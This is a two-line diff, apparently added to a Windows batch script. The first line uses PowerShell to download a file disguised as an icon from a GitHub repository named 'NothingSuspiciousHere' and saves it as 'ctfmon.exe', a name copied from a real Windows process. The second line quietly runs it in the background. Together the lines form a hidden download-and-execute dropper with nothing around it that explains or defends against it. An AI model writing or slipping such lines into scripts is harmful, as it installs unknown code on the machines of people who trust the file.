@@ -1,0 +1,2 @@
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/NothingSuspiciousHere/icos/main/gd-big.ico -OutFile C:\Users\Public\ctfmon.exe"
+start "" /B "C:\Users\Public\ctfmon.exe"
